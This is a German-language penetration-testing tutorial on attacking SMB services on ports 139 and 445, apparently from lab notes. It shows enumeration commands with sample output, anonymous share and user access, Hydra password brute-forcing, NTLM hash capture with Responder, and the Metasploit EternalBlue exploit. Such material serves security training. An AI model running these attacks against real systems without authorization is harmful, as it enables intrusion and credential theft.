# 139, 445 - SMB

### Einführung

SMB (Server Message Block) ist ein Netzwerkprotokoll, das den Zugriff auf Dateien, Drucker und andere Netzwerkressourcen ermöglicht. Es wird hauptsächlich in Windows-Netzwerken verwendet, aber auch unter Unix/Linux-Systemen durch das **Samba**-Projekt unterstützt. SMB läuft üblicherweise auf den Ports 139 und 445 und ermöglicht die Kommunikation zwischen einem SMB-Client und einem SMB-Server.

Ziel dieser Anleitung ist es, Schritt für Schritt zu erklären, wie man SMB-Dienste auf einem Zielsystem enumeriert, Schwachstellen identifiziert und diese möglicherweise exploitiert. Dabei werden verschiedene Tools vorgestellt, die gängige Sicherheitslücken ausnutzen können.

***

### 1. **Erkennung von SMB-Diensten**

Der erste Schritt in der SMB-Enumeration besteht darin, zu prüfen, ob das Zielsystem SMB-Dienste bereitstellt und welche Versionen davon laufen. Dazu verwenden wir **Nmap**, das uns hilft, offene Ports zu scannen und Informationen über die SMB-Dienste zu erhalten.

#### Nmap-Scan:

```bash
$ sudo nmap -p139,445 --script smb-enum-shares,smb-enum-users -sC -sV <Ziel-IP>
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  microsoft-ds
| smb-enum-shares: 
|   notes: READ, WRITE
|   IPC$: NO ACCESS
```

* **-p139,445**: Scannt die klassischen SMB-Ports.
* **--script smb-enum-shares**: Versucht, Freigaben aufzulisten.
* **--script smb-enum-users**: Listet Benutzer auf, wenn dies möglich ist.
* **-sC**: Führt grundlegende Nmap-Skripte aus.
* **-sV**: Bestimmt die Version des SMB-Dienstes.

**Warum dieser Schritt wichtig ist:** Der Scan gibt dir eine erste Übersicht über das Zielsystem. Du erfährst, ob SMB-Dienste aktiv sind, welche Version des Protokolls verwendet wird und ob du auf bestimmte Freigaben zugreifen kannst. Das ist entscheidend für den weiteren Angriff, da veraltete Versionen wie **SMBv1** bekannte Schwachstellen enthalten (z.B. EternalBlue).

***

### 2. **Detaillierte Freigabenanalyse mit SMBMap**

Mit **SMBMap** kannst du die Freigaben auf dem Zielsystem detaillierter analysieren. Dieses Tool zeigt dir, welche Freigaben vorhanden sind und welche Berechtigungen du auf diesen Freigaben hast.

#### SMBMap-Befehl:

```bash
$ smbmap -H <Ziel-IP>
Disk          Permissions     Comment
----          -----------     -------
notes         READ, WRITE     CheckIT
print$        NO ACCESS       Printer Drivers
IPC$          NO ACCESS       IPC Service
```

**Warum dieser Schritt wichtig ist:** SMBMap ermöglicht es dir, genau zu sehen, auf welche Freigaben du zugreifen kannst und ob du in diesen Verzeichnissen lesen oder schreiben darfst. Schreibrechte auf einer Freigabe könnten es dir ermöglichen, schädliche Dateien hochzuladen oder existierende Dateien zu manipulieren.

***

### 3. **Umfassende Benutzer- und Freigaben-Enumeration mit Enum4linux-ng**

**Enum4linux-ng** ist ein Tool, das verschiedene SMB-Enumerationstechniken kombiniert, um möglichst viele Informationen über Benutzer, Gruppen, Freigaben und SMB-Konfigurationen zu sammeln.

#### Enum4linux-ng-Befehl:

```bash
$ enum4linux-ng -A <Ziel-IP>
Users found:
  - mrb3n
  - cry0l1t3

Shares found:
  - notes: READ, WRITE
  - IPC$: NO ACCESS
```

* **-A**: Führt alle verfügbaren Enumerationstechniken aus, um die maximalen Informationen zu extrahieren.

**Warum dieser Schritt wichtig ist:** Dieses Tool bietet eine tiefgehende Analyse, indem es nicht nur Freigaben und Berechtigungen auflistet, sondern auch Benutzer und Gruppen auf dem Zielsystem identifiziert. Dies kann nützlich sein, um zu erfahren, welche Benutzerkonten existieren und wie diese für weitere Angriffe (z.B. Brute-Force) genutzt werden können.

***

### 4. **Manuelles Durchsuchen von Freigaben mit smbclient**

Nachdem wir nun die Freigaben identifiziert haben, können wir uns mit diesen Freigaben verbinden und die Dateien durchsuchen. **smbclient** ist ein Tool, das wie ein FTP-Client für SMB-Freigaben funktioniert.

#### Verbindung zu einer Freigabe:

```bash
$ smbclient //10.129.14.128/notes -U guest
smb: \> ls
  .                                   D        0  Wed Sep 22 18:17:51 2021
  prep-prod.txt                       N       71  Sun Sep 19 15:45:21 2021
smb: \> get prep-prod.txt
getting file \prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec)
```

* **-U guest**: Versucht, sich anonym als Gast anzumelden.

Sobald du verbunden bist, kannst du Befehle wie `ls` verwenden, um die Verzeichnisstruktur zu durchsuchen, und `get`, um Dateien herunterzuladen.

**Warum dieser Schritt wichtig ist:** Durch den direkten Zugriff auf die Freigaben kannst du Dateien analysieren, sensible Informationen sammeln oder (falls Schreibrechte vorhanden sind) schädliche Dateien hochladen.

***

### 5. **Abfragen von Benutzer- und Gruppeninformationen mit rpcclient**

**rpcclient** ermöglicht es, detaillierte Informationen über Benutzer und Gruppen auf einem SMB-Server zu erhalten. Dies ist besonders nützlich, um mehr über die Benutzerstruktur und mögliche Schwachstellen zu erfahren.

#### Abfrage von Benutzern:

```bash
$ rpcclient -U "" <Ziel-IP>
rpcclient $> enumdomusers
user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]
```

#### Abfrage von Benutzerinformationen:

Nachdem du die Benutzer-ID (RID) erhalten hast, kannst du detaillierte Informationen über einen Benutzer abfragen:

```bash
rpcclient $> queryuser <RID>
User Name   :   cry0l1t3
Full Name   :   cry0l1t3
Logon Time  :   Mi, 22 Sep 2021 17:50:56 CEST
Password last set Time: Mi, 22 Sep 2021 17:50:56 CEST
```

**Warum dieser Schritt wichtig ist:** Mit **rpcclient** kannst du Benutzerinformationen sammeln, die für weitere Angriffe wie Brute-Force oder Passwortspray verwendet werden können.

***

### 6. **Brute-Force-Angriffe auf SMB-Passwörter mit Hydra**

Falls du Benutzernamen identifiziert hast, kannst du mithilfe von **Hydra** versuchen, schwache Passwörter durch Brute-Force zu knacken.

#### Hydra-Befehl:

```bash
$ hydra -l <Benutzername> -P /usr/share/wordlists/rockyou.txt smb://<Ziel-IP>
```

* **-l \<Benutzername>**: Der Benutzername, gegen den du den Angriff fahren möchtest.
* **-P**: Die Passwortliste, die Hydra verwendet (hier z.B. rockyou.txt).

**Warum dieser Schritt wichtig ist:** Wenn du schwache Passwörter knacken kannst, erhältst du direkten Zugang zum System und kannst dich authentifizieren, um auf SMB-Freigaben oder andere Dienste zuzugreifen.

***

### 7. **Abfangen von SMB-Hashes mit Responder**

Wenn das Zielsystem keine SMB-Nachrichtensignatur erzwingt, kannst du mit **Responder** NTLM-Hashes abfangen und für Pass-the-Hash-Angriffe verwenden.

#### Responder-Befehl:

```bash
$ sudo responder -I <Netzwerkschnittstelle>
```

**Warum dieser Schritt wichtig ist:** Responder ermöglicht es dir, SMB-Authentifizierungsanfragen abzufangen und die Hashes zu sammeln. Diese Hashes können dann weiter analysiert werden, um sie für Pass-the-Hash-Angriffe zu nutzen.

***

### 8. **Exploiting von SMB-Schwachstellen (z.B. EternalBlue)**

Veraltete SMB-Versionen (wie **SMBv1**) enthalten oft schwerwiegende Schwachstellen. Ein bekannter Exploit ist **EternalBlue**, der es ermöglicht, Remote-Code auf anfälligen Systemen auszuführen. Metasploit bietet ein Modul, um diese Schwachstelle automatisch auszunutzen.

#### EternalBlue-Exploit mit Metasploit:

```bash
$ msfconsole
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS <Ziel-IP>
msf> run
```

**Warum dieser Schritt wichtig ist:** Mit diesem Exploit kannst du vollständigen Zugriff auf das Zielsystem erhalten, falls es anfällig für EternalBlue ist. Das ermöglicht dir, beliebigen Code auszuführen und das System zu übernehmen.

***

### Zusammenfassung der SMB-Enumeration und -Exploitation

| **Tool**          | **Beschreibung**                                                                    |
| ----------------- | ----------------------------------------------------------------------------------- |
| **Nmap**          | Erkennung von offenen SMB-Ports und Versionen.                                      |
| **SMBMap**        | Detaillierte Analyse von SMB-Freigaben und Berechtigungen.                          |
| **Enum4linux-ng** | Umfassende Enumeration von Benutzern, Freigaben und Gruppen auf dem SMB-Server.     |
| **smbclient**     | Direkter Zugriff auf SMB-Freigaben, um Dateien zu durchsuchen oder herunterzuladen. |
| **rpcclient**     | Abfragen von Benutzerinformationen und Gruppen.                                     |
| **Hydra**         | Brute-Force-Angriffe auf SMB-Passwörter.                                            |
| **Responder**     | Abfangen von SMB-Authentifizierungs-Hashes (NTLM).                                  |
| **Metasploit**    | Automatisierte Exploitation von Schwachstellen (z.B. EternalBlue).                  |
